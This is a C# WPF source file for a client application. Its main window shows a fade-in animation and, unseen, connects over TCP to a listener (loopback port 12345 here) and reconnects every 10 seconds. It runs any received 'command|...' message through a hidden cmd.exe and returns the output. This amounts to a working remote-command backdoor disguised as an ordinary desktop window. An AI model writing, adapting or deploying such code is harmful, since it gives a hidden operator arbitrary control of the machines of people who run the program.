using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Threading;
using System.Diagnostics;

namespace Client
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            this.MouseLeftButtonDown += (o, e) => { DragMove(); };
            Loaded += (serder, e) =>
            {
                var fadeInAnimation = new DoubleAnimation { From = 0, To = 1, Duration = TimeSpan.FromSeconds(0.5) };
                BeginAnimation(UIElement.OpacityProperty, fadeInAnimation);
            };
            StartClient();
        }
        static async Task StartClient()
        {
            while (true)
            {
                try
                {
                    TcpClient client = new TcpClient();
                    client.Connect(IPAddress.Loopback, 12345); 

                    NetworkStream stream = client.GetStream();
                    byte[] buffer = new byte[1024];

                    while (true)
                    {
                        int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                        if (bytesRead > 0)
                        {
                            string response = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                            Console.WriteLine(response);

                            string[] parts = response.Split('|');
                            if (parts.Length >= 2 && parts[0].Trim().ToLower() == "command")
                            {
                                string command = parts[1].Trim();

                                string result = RunCommand(command);

                                byte[] resultBytes = Encoding.ASCII.GetBytes(result);
                                await stream.WriteAsync(resultBytes, 0, resultBytes.Length);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("连接错误: " + ex.Message);
                    Thread.Sleep(10000); 
                }
            }
        }

        static string RunCommand(string command)
        {
            string result = string.Empty;

            try
            {
                Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe", // CMD执行程序
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        Arguments = "/c " + command // /c 参数表示执行完命令后关闭CMD窗口
                    }
                };

                process.Start();

                // 读取命令的标准输出和错误输出
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                process.WaitForExit();

                if (!string.IsNullOrEmpty(output))
                {
                    result += "标准输出:\n" + output;
                }

                if (!string.IsNullOrEmpty(error))
                {
                    result += "错误输出:\n" + error;
                }
            }
            catch (Exception ex)
            {
                result = "错误: " + ex.Message;
            }

            return result;
        }
    }
}
